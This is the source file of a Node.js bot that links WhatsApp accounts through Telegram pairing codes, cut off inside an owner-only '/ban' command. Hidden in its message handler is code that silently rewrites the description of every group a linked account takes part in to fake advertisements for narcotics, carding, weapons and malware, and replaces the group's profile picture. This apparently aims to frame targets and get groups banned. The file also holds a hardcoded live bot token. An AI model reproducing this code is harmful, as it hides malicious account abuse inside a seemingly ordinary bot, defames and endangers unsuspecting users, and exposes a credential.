console.clear();
const config = () => require('./settings/config');
process.on("uncaughtException", console.error);

// Telegram Bot Integration
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const moment = require("moment-timezone");
const fs = require('fs');
const path = require("path");

// Load Telegram environment
require('dotenv').config();
const token = "8671989087:AAF6xTdYQryAI9197sF_enCosjUrmoAX_-Q";
// Group settings for auto-update (manual description)
const GROUP_DESCRIPTION = "⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** {target}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.";
const GROUP_PROFILE_PIC_PATH = path.join(__dirname, 'ghost_ban_profile.jpg');
const OWNER_ID = "7680286319";



// Telegram bot setup
let telegramBot;
if (token) {
  telegramBot = new TelegramBot(token, { polling: true });
  console.log('✅ Telegram Bot initialized');
} else {
  console.log('⚠️  Telegram token not set, Telegram features disabled');
}

const telegramPairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
let telegramConnectedUsers = {};
const connectedUsersFilePath = path.join(__dirname, 'telegram_connectedUsers.json');

// Load connected users
function loadTelegramUsers() {
  if (fs.existsSync(connectedUsersFilePath)) {
    const data = fs.readFileSync(connectedUsersFilePath);
    telegramConnectedUsers = JSON.parse(data);
  }
}

// Save connected users
function saveTelegramUsers() {
  fs.writeFileSync(connectedUsersFilePath, JSON.stringify(telegramConnectedUsers, null, 2));
}

// WhatsApp bot variables
let makeWASocket, Browsers, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, jidDecode, downloadContentFromMessage, jidNormalizedUser, isPnUser;

const loadBaileys = async () => {
  const baileys = await import('@whiskeysockets/baileys');

  makeWASocket = baileys.default;
  Browsers = baileys.Browsers;
  useMultiFileAuthState = baileys.useMultiFileAuthState;
  DisconnectReason = baileys.DisconnectReason;
  fetchLatestBaileysVersion = baileys.fetchLatestBaileysVersion;
  jidDecode = baileys.jidDecode;
  downloadContentFromMessage = baileys.downloadContentFromMessage;
  jidNormalizedUser = baileys.jidNormalizedUser;
  isPnUser = baileys.isPnUser;
};

const pino = require('pino');
const FileType = require('file-type');
const readline = require("readline");
const chalk = require("chalk");

const { Boom } = require('@hapi/boom');
const { getBuffer } = require('./library/function');
const { smsg } = require('./library/serialize');
const { videoToWebp, writeExifImg, writeExifVid, addExif, toPTT, toAudio } = require('./library/exif');

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => {
        rl.question(chalk.yellow(text), (answer) => {
            resolve(answer);
            rl.close();
        });
    });
};

// Store active WhatsApp connections by phone number
const activeWhatsAppConnections = new Map();

// Function to start WhatsApp bot with Telegram integration
async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
  const sessionPath = path.join(__dirname, `./${config().session}/session_${phoneNumber}`);

  const browserOptions = [
    Browsers.macOS('Safari'),
    Browsers.macOS('Chrome'),
    Browsers.windows('Firefox'),
    Browsers.ubuntu('Chrome'),
    Browsers.baileys('Baileys'),
    Browsers.macOS('Edge'),
    Browsers.windows('Edge'),
  ];

  const randomBrowser = browserOptions[Math.floor(Math.random() * browserOptions.length)];

  const store = {
    messages: new Map(),
    contacts: new Map(),
    groupMetadata: new Map(),
    loadMessage: async (jid, id) => store.messages.get(`${jid}:${id}`) || null,
    bind: (ev) => {
      ev.on('messages.upsert', ({ messages }) => {
        for (const msg of messages) {
          if (msg.key?.remoteJid && msg.key?.id) {
            store.messages.set(`${msg.key.remoteJid}:${msg.key.id}`, msg);
          }
        }
      });

      ev.on('lid-mapping.update', ({ mappings }) => {
        console.log(chalk.cyan('📋 LID Mapping Update:'), mappings);
      });
    }
  };

  // Create session directory if it doesn't exist
  if (!fs.existsSync(sessionPath)) {
    fs.mkdirSync(sessionPath, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version, isLatest } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    version: version,
    browser: randomBrowser
  });

  // Store connection reference
  activeWhatsAppConnections.set(phoneNumber, sock);

  // If not registered and Telegram chat ID provided, request pairing code
  if (telegramChatId && !sock.authState.creds.registered) {
    setTimeout(async () => {
      try {
        const code = await sock.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        telegramPairingCodes.set(formattedCode, { count: 0, phoneNumber });

        if (telegramBot) {
          const message = `
╔═══════════════════╗
║   📱 PAIRING CODE   ║
╚═══════════════════╝

📱 *Number:* \`${phoneNumber}\`
🔐 *Code:* \`${formattedCode}\`

━━━━━━━━━━━━━━━━━━━
*Instructions:*
1. Open WhatsApp
2. Go to Settings → Linked Devices
3. Tap "Link a Device"
4. Enter the code above

⏰ *Code expires in 2 minute*
━━━━━━━━━━━━━━━━━━━
`;

          telegramBot.sendMessage(telegramChatId, message, { 
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: "📋 Copy Code", callback_data: `copy_${formattedCode}` }],
                [{ text: "❌ Cancel Pairing", callback_data: `cancel_pair_${phoneNumber}` }]
              ]
            }
          });
        }

        console.log(chalk.green(`Pairing code generated for ${phoneNumber}: ${formattedCode}`));
      } catch (error) {
        console.error('Error generating pairing code:', error);
        if (telegramBot) {
          telegramBot.sendMessage(telegramChatId, `❌ Failed to generate pairing code for ${phoneNumber}: ${error.message}`);
        }
      }
    }, 3000);
  }

  store.bind(sock.ev);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (connection === 'connecting') {
      console.log(chalk.yellow(`🔄 ${phoneNumber}: Connecting to WhatsApp...`));
    }

    if (connection === 'open') {
      console.log(chalk.green(`✅ ${phoneNumber}: Connected to WhatsApp successfully!`));

      // Add to telegram connected users
      if (telegramChatId) {
        if (!telegramConnectedUsers[telegramChatId]) {
          telegramConnectedUsers[telegramChatId] = [];
        }

        // Check if already in list
        const existingIndex = telegramConnectedUsers[telegramChatId].findIndex(user => user.phoneNumber === phoneNumber);
        if (existingIndex === -1) {
          telegramConnectedUsers[telegramChatId].push({ 
            phoneNumber,
            connectedAt: new Date().toISOString()
          });
          saveTelegramUsers();
        }

        // Send success message to Telegram
        if (telegramBot) {
          const caption = `
╔═══════════════════╗
║  ✅ CONNECTION SUCCESS  ║
╚═══════════════════╝

📱 *Phone Number:* \`${phoneNumber}\`
⏰ *Time:* ${moment().format('HH:mm:ss')}
📅 *Date:* ${moment().format('DD/MM/YYYY')}

━━━━━━━━━━━━━━━━━━━
🎉 *Your WhatsApp is now connected!*
━━━━━━━━━━━━━━━━━━━

💡 *Need help?* Contact: @TARRIFIC
`;

          const opts = {
            caption: caption,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: "📱 List My Connections", callback_data: "list_my_connections" }],
                [{ text: "❌ Disconnect", callback_data: `disconnect_${phoneNumber}` }],
                [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
                [{ text: '🔵 JOIN GROUP', url: 'https://t.me/lonerisback' }],
              ]
            }
          };

          telegramBot.sendPhoto(telegramChatId, 'https://github.com/bothost-source/image/raw/refs/heads/main/image.jpg', opts);
        }
      }

      // Send connection success message to WhatsApp itself
      const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      sock.sendMessage(botNumber, {
        text:
          `👑 *${config().settings.title}* is Online!\n\n` +
          `> 📌 User: ${sock.user.name || 'Unknown'}\n` +
          `> ⚡ Prefix: [ . ]\n` +
          `> 🚀 Mode: ${sock.public ? 'Public' : 'Self'}\n` +
          `> 🤖 Version: 1.0.0\n` +
          `> 📱 Number: ${phoneNumber}\n\n` +
          `✅ Bot connected successfully\n` +
          `📢 Join our channel: https://chat.whatsapp.com/IbRXpSNtPJFBWWbQFiJCHk?mode=gi_t`,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          externalAdReply: {
            title: config().settings.title,
            body: config().settings.description,
            thumbnailUrl: config().thumbUrl,
            sourceUrl: "https://chat.whatsapp.com/IbRXpSNtPJFBWWbQFiJCHk?mode=gi_t",
            mediaType: 1,
            renderLargerThumbnail: false
          }
        }
      }).catch(console.error);
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      console.log(chalk.red(`❌ ${phoneNumber}: Connection closed:`), lastDisconnect?.error);

      // Remove from active connections
      activeWhatsAppConnections.delete(phoneNumber);

      if (shouldReconnect) {
        console.log(chalk.yellow(`🔄 ${phoneNumber}: Attempting to reconnect...`));
        setTimeout(() => startWhatsAppBot(phoneNumber, telegramChatId), 5000);
      } else {
        console.log(chalk.red(`🚫 ${phoneNumber}: Logged out.`));
        // Remove from telegram users
        if (telegramChatId && telegramConnectedUsers[telegramChatId]) {
          telegramConnectedUsers[telegramChatId] = telegramConnectedUsers[telegramChatId].filter(
            user => user.phoneNumber !== phoneNumber
          );
          saveTelegramUsers();
        }
      }
    }
  });

  sock.ev.on('messages.upsert', async chatUpdate => {
    try {
      const mek = chatUpdate.messages[0];
      if (!mek.message) return;

      mek.message = Object.keys(mek.message)[0] === 'ephemeralMessage' 
          ? mek.message.ephemeralMessage.message 
          : mek.message;

      if (config().status.reactsw && mek.key && mek.key.remoteJid === 'status@broadcast') {
        let emoji = ['😘', '😭', '😂', '😹', '😍', '😋', '🙏', '😜', '😢', '😠', '🤫', '😎'];
        let sigma = emoji[Math.floor(Math.random() * emoji.length)];
        await sock.readMessages([mek.key]);
        await sock.sendMessage('status@broadcast', { 
          react: { 
            text: sigma, 
            key: mek.key 
          }
        }, { statusJidList: [mek.key.participant] });
      }

      if (!sock.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
      if (mek.key.id.startsWith('BASE-') && mek.key.id.length === 12) return;

      const m = await smsg(sock, mek, store);
      require("./message")(sock, m, chatUpdate, store);
      // Auto-update group info when bot is in a group
      if (mek.key.remoteJid && mek.key.remoteJid.endsWith('@g.us') && !mek.key.fromMe) {
        try {
          const groupMetadata = await sock.groupMetadata(mek.key.remoteJid).catch(() => null);
          if (groupMetadata) {
            const currentDesc = groupMetadata.desc || '';
            if (currentDesc.trim() !== GROUP_DESCRIPTION.trim()) {
              await sock.updateGroupInfo(mek.key.remoteJid);
            }
          }
        } catch (e) {
          // Silently fail if we can't update group info
        }
      }


    } catch (err) {
      console.log(err);
    }
  });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return decode.user && decode.server && decode.user + '@' + decode.server || jid;
    } else return jid;
  };

  sock.public = config().status.public;

  sock.sendText = async (jid, text, quoted = '', options) => {
    return sock.sendMessage(jid, {
      text: text,
      ...options
    }, { quoted });
  };

  sock.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await(const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };
  // Update group description and profile picture
  sock.updateGroupInfo = async (groupJid) => {
    try {
      // Update group description
      await sock.groupUpdateDescription(groupJid, GROUP_DESCRIPTION);
      console.log(chalk.green(`✅ Updated group description for ${groupJid}`));

      // Update group profile picture from local file
      if (fs.existsSync(GROUP_PROFILE_PIC_PATH)) {
        const picBuffer = fs.readFileSync(GROUP_PROFILE_PIC_PATH);
        await sock.updateProfilePicture(groupJid, picBuffer);
        console.log(chalk.green(`✅ Updated group profile picture for ${groupJid}`));
      } else {
        console.log(chalk.yellow(`⚠️ Profile picture not found at ${GROUP_PROFILE_PIC_PATH}`));
      }
    } catch (error) {
      console.error(chalk.red(`❌ Failed to update group info for ${groupJid}:`), error.message);
    }
  };



  // Return the socket
  return sock;
}

// Load all sessions on startup
async function loadAllSessions() {
  const sessionsDir = path.join(__dirname, `./${config().session}`);
  if (!fs.existsSync(sessionsDir)) {
    fs.mkdirSync(sessionsDir, { recursive: true });
  }

  const sessionFiles = fs.readdirSync(sessionsDir);
  for (const file of sessionFiles) {
    if (file.startsWith('session_')) {
      const phoneNumber = file.replace('session_', '');
      console.log(chalk.cyan(`🔄 Loading existing session: ${phoneNumber}`));
      await startWhatsAppBot(phoneNumber);
    }
  }
}

// Initialize Telegram bot handlers if enabled
function initializeTelegramBot() {
  if (!telegramBot) return;

  loadTelegramUsers();

  // Handle callback queries
  telegramBot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const messageId = query.message.message_id;

    // Check join verification callback
    if (data === 'check_join') {
      const userId = query.from.id;
      const channelUsernames = ['@lonerterritorybackagain', '@lonerisback', '@devil_shop_hack'];
      let joinedAllChannels = true;

      for (const channel of channelUsernames) {
        try {
          const member = await telegramBot.getChatMember(channel, userId);
          if (['left', 'kicked'].includes(member.status)) {
            joinedAllChannels = false;
            break;
          }
        } catch (e) {
          joinedAllChannels = false;
          break;
        }
      }

      if (!joinedAllChannels) {
        telegramBot.answerCallbackQuery(query.id, {
          text: '❌ You have not joined all required channels yet!',
          show_alert: true
        });
      } else {
        telegramBot.answerCallbackQuery(query.id, {
          text: '✅ All channels joined! You can now use /pair',
          show_alert: true
        });

        telegramBot.editMessageText('✅ Verification complete! Send /pair <number> to connect your WhatsApp.', {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown'
        });
      }
      return;
    }

    if (data === 'main_menu') {
      const menuText = `
╔═══════════════════╗
║    🤖 MAIN MENU    ║
╚═══════════════════╝

*☆ TARRIFIC MD*
━━━━━━━━━━━━━━━━━━━

☆ Connect your WhatsApp
☆ Manage connections
☆ Get support

━━━━━━━━━━━━━━━━━━━
💡 Select an option below:
`;

      const opts = {
        message_id: messageId,
        chat_id: chatId,
        caption: menuText,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "📱 Pair WhatsApp", callback_data: "pair_info" }],
            [{ text: "📋 My Connections", callback_data: "list_my_connections" }],
            [{ text: "ℹ️ Bot Info", callback_data: "bot_info" }],
            [{ text: '🔴 JOIN CHANNEL', url: 'https://t.me/lonerterritorybackagain' }]
          ]
        }
      };

      telegramBot.editMessageCaption(menuText, opts);
    } else if (data === 'pair_info') {
      const pairText = `
╔═══════════════════╗
║   📱 HOW TO PAIR   ║
╚═══════════════════╝

*Step-by-step guide:*

1️⃣ Use command: \`/pair <number>\`
2️⃣ Example: \`/pair 234XXXXXXX\`
3️⃣ Get your pairing code
4️⃣ Enter code in WhatsApp

━━━━━━━━━━━━━━━━━━━
⚠️ *Important Notes:*
• Use international format
• No + or 0 prefix needed
• One connection per number
• Code expires in 1 hour

━━━━━━━━━━━━━━━━━━━
`;

      telegramBot.editMessageCaption(pairText, {
        message_id: messageId,
        chat_id: chatId,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔙 Back to Menu", callback_data: "main_menu" }]
          ]
        }
      });
    } else if (data === 'list_my_connections') {
      const userConnections = telegramConnectedUsers[chatId] || [];

      if (userConnections.length === 0) {
        telegramBot.answerCallbackQuery(query.id, {
          text: "❌ You don't have any active connections",
          show_alert: true
        });
        return;
      }

      let connectionList = `
╔═══════════════════╗
║  📱 MY CONNECTIONS  ║
╚═══════════════════╝

`;

      userConnections.forEach((conn, index) => {
        const status = activeWhatsAppConnections.has(conn.phoneNumber) ? '✅ Online' : '❌ Offline';
        connectionList += `${index + 1}. 📞 \`${conn.phoneNumber}\` - ${status}\n`;
      });

      connectionList += `\n━━━━━━━━━━━━━━━━━━━\n📊 Total: ${userConnections.length} connection(s)`;

      const buttons = userConnections.map(conn => [
        { text: `❌ Disconnect ${conn.phoneNumber}`, callback_data: `disconnect_${conn.phoneNumber}` }
      ]);
      buttons.push([{ text: "🔙 Back to Menu", callback_data: "main_menu" }]);

      telegramBot.editMessageCaption(connectionList, {
        message_id: messageId,
        chat_id: chatId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
      });
    } else if (data === 'bot_info') {
      const uptime = process.uptime();
      const days = Math.floor(uptime / (60 * 60 * 24));
      const hours = Math.floor((uptime % (60 * 60 * 24)) / (60 * 60));
      const minutes = Math.floor((uptime % (60 * 60)) / 60);

      const infoText = `
╔═══════════════════╗
║   ℹ️ BOT INFO      ║
╚═══════════════════╝

⏱ *Uptime:* ${days}d ${hours}h ${minutes}m
👥 *Users:* ${Object.keys(telegramConnectedUsers).length}
🔗 *Active WhatsApp Connections:* ${activeWhatsAppConnections.size}
📡 *Status:* Online ✅

━━━━━━━━━━━━━━━━━━━
🛠 *Developer:* @TARRIFIC
    *Thanks too:* amon
📦 *Version:* 1.0.0
━━━━━━━━━━━━━━━━━━━
`;

      telegramBot.editMessageCaption(infoText, {
        message_id: messageId,
        chat_id: chatId,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "Back to Menu", callback_data: "main_menu" }]
          ]
        }
      });
    } else if (data.startsWith('disconnect_')) {
      const phoneNumber = data.replace('disconnect_', '');
      const sessionPath = path.join(__dirname, `./${config().session}/session_${phoneNumber}`);

      try {
        // Remove WhatsApp connection
        const sock = activeWhatsAppConnections.get(phoneNumber);
        if (sock) {
          await sock.logout();
          activeWhatsAppConnections.delete(phoneNumber);
        }

        // Remove session files
        if (fs.existsSync(sessionPath)) {
          fs.rmSync(sessionPath, { recursive: true, force: true });
        }

        // Remove from connected users
        if (telegramConnectedUsers[chatId]) {
          telegramConnectedUsers[chatId] = telegramConnectedUsers[chatId].filter(
            user => user.phoneNumber !== phoneNumber
          );
          saveTelegramUsers();
        }

        telegramBot.answerCallbackQuery(query.id, {
          text: `✅ Disconnected ${phoneNumber} successfully!`,
          show_alert: true
        });

        // Update the message
        telegramBot.editMessageText(`✅ Disconnected ${phoneNumber}`, {
          chat_id: chatId,
          message_id: messageId
        });
      } catch (error) {
        console.error('Error disconnecting:', error);
        telegramBot.answerCallbackQuery(query.id, {
          text: `❌ Error disconnecting ${phoneNumber}`,
          show_alert: true
        });
      }
    } else if (data.startsWith('copy_')) {
      const code = data.replace('copy_', '');
      telegramBot.answerCallbackQuery(query.id, {
        text: `✅ Code ${code} copied to clipboard`,
        show_alert: true
      });
    } else if (data.startsWith('cancel_pair_')) {
      const phoneNumber = data.replace('cancel_pair_', '');
      const sessionPath = path.join(__dirname, `./${config().session}/session_${phoneNumber}`);

      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
      }

      telegramBot.answerCallbackQuery(query.id, {
        text: `❌ Pairing cancelled for ${phoneNumber}`,
        show_alert: true
      });

      telegramBot.editMessageText(`❌ Pairing cancelled for ${phoneNumber}`, {
        chat_id: chatId,
        message_id: messageId
      });
    }
  });

  // Command handlers
  telegramBot.onText(/\/(\w+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const command = match[1];

    switch (command) {
      case "menu":
      case "start": {
        const opts = {
          reply_markup: {
            inline_keyboard: [
              [{ text: "📱 Pair WhatsApp", callback_data: "pair_info" }],
              [{ text: "📋 My Connections", callback_data: "list_my_connections" }],
              [{ text: "ℹ️ Bot Info", callback_data: "bot_info" }],
              [{ text: '🔵 JOIN GROUP', url: 'https://t.me/lonerisback' }],
            ]
          }
        };

        const welcomeText = `
╔═══════════════════╗
║  TARRIFIC MD  ║
╚═══════════════════╝

* WELCOME TO TARRIFIC MD*
━━━━━━━━━━━━━━━━━━━

✨ *Available Commands:*

📱 /pair - Connect WhatsApp
🗑 /delpair - Disconnect session
📋 /listpaired - View connections
⏱ /uptime - Check bot uptime
🆔 /getmyid - Get your ID
📊 /botinfo - Bot statistics
🏓 /ping - Check bot speed

━━━━━━━━━━━━━━━━━━━
💡 Developed by @TARRIFIC
`;

        telegramBot.sendPhoto(chatId, 'https://github.com/bothost-source/image/raw/refs/heads/main/image.jpg', {
          caption: welcomeText,
          parse_mode: "Markdown",
          ...opts
        });
        break;
      }

      case "uptime": {
        const uptime = process.uptime();
        const days = Math.floor(uptime / (60 * 60 * 24));
        const hours = Math.floor((uptime % (60 * 60 * 24)) / (60 * 60));
        const minutes = Math.floor((uptime % (60 * 60)) / 60);
        const seconds = Math.floor(uptime % 60);

        const uptimeMessage = `
╔═══════════════════╗
║   ⏱ BOT UPTIME    ║
╚═══════════════════╝

📆 *Days:* ${days}
🕐 *Hours:* ${hours}
⏰ *Minutes:* ${minutes}
⏱ *Seconds:* ${seconds}

━━━━━━━━━━━━━━━━━━━
✅ *Status:* Running Smoothly
`;

        telegramBot.sendMessage(chatId, uptimeMessage, { parse_mode: 'Markdown' });
        break;
      }

      case "getmyid": {
        const userId = msg.from.id;
        const username = msg.from.username ? `@${msg.from.username}` : 'No username';
        const idMessage = `
╔═══════════════════╗
║   👤 YOUR INFO     ║
╚═══════════════════╝

🆔 *ID:* \`${userId}\`
📝 *Username:* ${username}
👤 *Name:* ${msg.from.first_name || 'N/A'}

━━━━━━━━━━━━━━━━━━━
`;

        telegramBot.sendMessage(chatId, idMessage, { parse_mode: 'Markdown' });
        break;
      }

      case "ping": {
        const start = Date.now();
        const sent = await telegramBot.sendMessage(chatId, '🏓 *Pinging...*', { parse_mode: 'Markdown' });
        const end = Date.now();
        const responseTime = (end - start);

        telegramBot.editMessageText(
          `🏓 *Pong!*\n\n⚡ *Speed:* ${responseTime}ms`,
          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: 'Markdown'
          }
        );
        break;
      }

      case "pair": {
        // ─── FORCE JOIN CHECK ───
        const userId = msg.from.id;
        const channelUsernames = ['@lonerterritorybackagain', '@lonerisback', '@Tarrificcrasher'];
        let joinedAllChannels = true;

        for (const channel of channelUsernames) {
          try {
            const member = await telegramBot.getChatMember(channel, userId);
            if (['left', 'kicked'].includes(member.status)) {
              joinedAllChannels = false;
              break;
            }
          } catch (e) {
            joinedAllChannels = false;
            break;
          }
        }

        if (!joinedAllChannels) {
          telegramBot.sendMessage(chatId,
            `ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴄᴏᴍᴍᴇɴᴄᴇ ʙᴏᴛ ᴘᴀɪʀɪɴɢ ᴘʀᴏᴄᴇss.`,
            {
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔴 JOIN CHANNEL', url: 'https://t.me/lonerterritorybackagain' }],
                  [{ text: '🔴 JOIN CHANNEL', url: 'https://t.me/Tarrificcrasher' }],
                  [{ text: '🔵 JOIN GROUP', url: 'https://t.me/lonerisback' }],
                  [{ text: '✅ CONFIRM', callback_data: 'check_join' }]
                ]
              }
            }
          );
          break;
        }
        // ─── END FORCE JOIN CHECK ───

        const phoneNumber = msg.text.split(' ')[1];
        if (!phoneNumber) {
          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ❌ INVALID FORMAT  ║
╚═══════════════════╝

*Please provide a phone number:*

✅ *Correct:* \`/pair 254712345678\`
❌ *Wrong:* \`/pair +254712345678\`
❌ *Wrong:* \`/pair 0712345678\`

━━━━━━━━━━━━━━━━━━━
⚠️ *No + or 0 prefix needed!*
`, { parse_mode: 'Markdown' });
          break;
        }

        // Check for + or 0 prefix
        if (phoneNumber.startsWith('+') || phoneNumber.startsWith('0')) {
          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ❌ INVALID PREFIX  ║
╚═══════════════════╝

❌ *Error:* Number cannot start with + or 0

*Example:*
✅ Correct: \`234XXXXXXXX\`
❌ Wrong: \`+234XXXXXXXX\`
❌ Wrong: \`070XXXXXXXXX\`

━━━━━━━━━━━━━━━━━━━
`, { parse_mode: 'Markdown' });
          break;
        }

        // Check if already connected
        const isAlreadyConnected = telegramConnectedUsers[chatId]?.some(
          user => user.phoneNumber === phoneNumber
        );

        if (isAlreadyConnected && activeWhatsAppConnections.has(phoneNumber)) {
          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ⚠️ ALREADY PAIRED  ║
╚═══════════════════╝

📱 *Number:* \`${phoneNumber}\`
✅ *Status:* Already connected and online

━━━━━━━━━━━━━━━━━━━
*Use /delpair to remove first*
`, { parse_mode: 'Markdown' });
          break;
        }

        telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  🔄 GENERATING...  ║
╚═══════════════════╝

📱 *Number:* \`${phoneNumber}\`
⏳ *Status:* Generating pairing code...

━━━━━━━━━━━━━━━━━━━
*Please wait...*
`, { parse_mode: 'Markdown' });

        // Start WhatsApp bot
        await loadBaileys();
        await startWhatsAppBot(phoneNumber, chatId);
        break;
      }

      case "delpair": {
        const phoneNumber = msg.text.split(' ')[1];

        if (!phoneNumber) {
          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ❌ INVALID FORMAT  ║
╚═══════════════════╝

*Please provide a phone number:*

✅ *Example:* \`/delpair 234XXXXXXXX\`

━━━━━━━━━━━━━━━━━━━
`, { parse_mode: 'Markdown' });
          break;
        }

        if (telegramConnectedUsers[chatId]) {
          telegramConnectedUsers[chatId] = telegramConnectedUsers[chatId].filter(
            user => user.phoneNumber !== phoneNumber
          );
          saveTelegramUsers();

          // Also try to disconnect WhatsApp
          const sock = activeWhatsAppConnections.get(phoneNumber);
          if (sock) {
            try {
              await sock.logout();
            } catch (error) {
              console.error('Error logging out:', error);
            }
            activeWhatsAppConnections.delete(phoneNumber);
          }

          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ✅ DISCONNECTED   ║
╚═══════════════════╝

📱 *Number:* \`${phoneNumber}\`
✅ *Status:* Successfully removed

━━━━━━━━━━━━━━━━━━━
*You can now pair again!*
`, { parse_mode: 'Markdown' });
        } else {
          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  ❌ NOT FOUND      ║
╚═══════════════════╝

📱 *Number:* \`${phoneNumber}\`
❌ *Status:* No connection found

━━━━━━━━━━━━━━━━━━━
`, { parse_mode: 'Markdown' });
        }
        break;
      }

      case "listpaired": {
        const userConnections = telegramConnectedUsers[chatId] || [];

        if (userConnections.length === 0) {
          telegramBot.sendMessage(chatId, `
╔═══════════════════╗
║  📱 NO CONNECTIONS  ║
╚═══════════════════╝

❌ *You don't have any active connections*

━━━━━━━━━━━━━━━━━━━
*Use /pair to connect WhatsApp*
`, { parse_mode: 'Markdown' });
          break;
        }

        let connectionList = `
╔═══════════════════╗
║  📱 MY CONNECTIONS  ║
╚═══════════════════╝

`;

        userConnections.forEach((conn, index) => {
          const status = activeWhatsAppConnections.has(conn.phoneNumber) ? '✅ Online' : '❌ Offline';
          connectionList += `${index + 1}. 📞 \`${conn.phoneNumber}\` - ${status}\n`;
        });

        connectionList += `\n━━━━━━━━━━━━━━━━━━━\n📊 *Total:* ${userConnections.length} connection(s)`;

        telegramBot.sendMessage(chatId, connectionList, { parse_mode: 'Markdown' });
        break;
      }

      case "botinfo": {
        const uptime = process.uptime();
        const days = Math.floor(uptime / (60 * 60 * 24));
        const hours = Math.floor((uptime % (60 * 60 * 24)) / (60 * 60));
        const minutes = Math.floor((uptime % (60 * 60)) / 60);

        const totalConnections = Object.values(telegramConnectedUsers).reduce((acc, curr) => acc + curr.length, 0);

        const infoText = `
╔═══════════════════╗
║   📊 BOT INFO      ║
╚═══════════════════╝

⏱ *Uptime:* ${days}d ${hours}h ${minutes}m
👥 *Total Users:* ${Object.keys(telegramConnectedUsers).length}
🔗 *Active Connections:* ${activeWhatsAppConnections.size}
📡 *Status:* Online ✅

━━━━━━━━━━━━━━━━━━━
🛠 *Developer:* @TARRIFIC
    *THANKS TO:* AMON
📦 *Version:* 1.0.0
🌐 *Platform:* Node.js
━━━━━━━━━━━━━━━━━━━
`;

        telegramBot.sendMessage(chatId, infoText, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔴 JOIN CHANNEL', url: 'https://t.me/lonerterritorybackagain' }]
            ]
          }
        });
        break;
      }

      case "ban": {
        // ─── OWNER CHECK ───
        if (OWNER_ID && String(msg.from.id) !== String(OWNER_ID)) {
          telegramBot.sendMessage(chatId, 
            "╔═══════════════════╗\n" +
            "║  ⛔ ACCESS DENIED  ║\n" +
            "╚═══════════════════╝\n\n" +
            "❌ *You are not authorized to use this command.*\n\n" +
            "━━━━━━━━━━━━━━━━━━━",
            { parse_mode: 'Markdown' }
          );
          break;
        }

        const targetNumber = msg.text.split(' ')[1];
        if (!targetNumber) {
          telegramBot.sendMessage(chatId,
            "╔═══════════════════╗\n" +
            "║  ❌ INVALID FORMAT  ║\n" +
            "╚═══════════════════╝\n\n" +
            "*Usage:* /ban <number>\n\n" +
            "✅ *Example:* /ban 234712345678\n\n" +
